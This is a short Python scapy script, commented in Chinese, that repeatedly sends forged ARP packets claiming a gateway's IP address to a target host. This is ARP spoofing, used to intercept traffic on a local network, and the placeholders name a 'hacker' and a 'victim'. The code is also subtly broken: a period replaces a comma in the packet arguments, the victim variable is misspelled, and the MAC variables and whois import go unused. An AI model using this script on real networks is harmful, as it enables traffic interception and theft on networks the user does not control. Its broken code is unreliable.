from scapy.all import *
import whois
import time
def main():
    getwayIP="[网关IP]"
    vicitmIP="[目标IP]"
    hackMAC="[黑客的网关]"
    victimMAC="[目标的网关]"
    #print(getmacbyip("[ip]")) 可利用这个来获得网关
    packet=Ether()/ARP(psrc=getwayIP.pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())
    pass
if __name__ == '__main__':
    main()